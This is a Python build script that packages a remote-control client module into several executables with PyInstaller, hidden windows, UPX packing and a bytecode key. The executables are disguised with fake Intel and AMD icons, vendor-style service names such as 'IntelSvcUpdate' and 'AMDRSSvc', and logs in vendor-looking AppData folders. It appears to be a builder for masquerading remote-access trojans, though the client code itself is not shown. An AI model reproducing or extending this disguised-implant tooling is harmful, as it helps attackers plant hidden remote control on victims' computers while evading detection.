import os


batch_build_dir = os.getcwd()
program_root_dir = os.path.abspath(os.path.join(os.getcwd(), '..'))
upx_dir = 'C:\\ProgramLocalLow\\upx-4.0.2-win64'

data = {
    1: {'fake_type': 'amd'},
    2: {'fake_type': 'intel'},
    3: {'fake_type': 'intel'},
    4: {'fake_type': 'intel'},
}

for k, v in data.items():
    if data[k]['fake_type'] == 'intel':
        v['icon'] = f"{program_root_dir}\\resource\\fake_Intel.ico"
        v['name'] = f'IntelSvcUpdate_{k}.exe'
        v['log_dir'] = r'C:\Users\Administrator\AppData\Local\Intel\log'

    elif data[k]['fake_type'] == 'amd':
        v['icon'] = f"{program_root_dir}\\resource\\fake_AMD.ico"
        v['name'] = f'AMDRSSvc_{k}.exe'
        v['log_dir'] = r'C:\Users\Administrator\AppData\Local\AMD_Common\log'

    else:
        raise SyntaxError


for k, v in data.items():
    with open(f"{batch_build_dir}\\tmp.py", mode='w+') as f:
        f.write(f"from SelfDefinedScripts.CtrlClient import RemoteCtrlClient\n"
                f"RemoteCtrlClient({str(k)}, r'{v['log_dir']}').exec()")

    _ = f"pyinstaller -F -w " \
        f"-n {v['name']} " \
        f"-i {v['icon']} " \
        f"--upx-dir={upx_dir} " \
        f"--key sUMdGrYZ3aDssGyp " \
        f"{batch_build_dir}\\tmp.py"
    print(_)
    os.system(_)

os.remove(f"{batch_build_dir}\\tmp.py")
